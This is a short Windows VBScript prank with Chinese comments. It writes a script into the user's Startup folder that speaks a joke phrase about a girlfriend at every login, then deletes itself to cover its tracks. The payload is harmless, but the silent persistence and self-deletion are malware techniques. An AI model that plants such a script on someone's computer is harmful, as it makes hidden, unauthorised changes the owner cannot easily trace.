set fso=CreateObject("Scripting.FileSystemObject")
'下面这是开机启动项的路径
set path=fso.createtextfile("C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\我喜欢你.vbs",2)
path.writeline("CreateObject(""SAPI.SpVoice"").Speak""介绍一下,我女朋友林允儿!""")
path.close
'以下是删除自己
Dim delete
Set delete=CreateObject("Scripting.FileSystemObject")
delete.DeleteFile WScript.ScriptFullName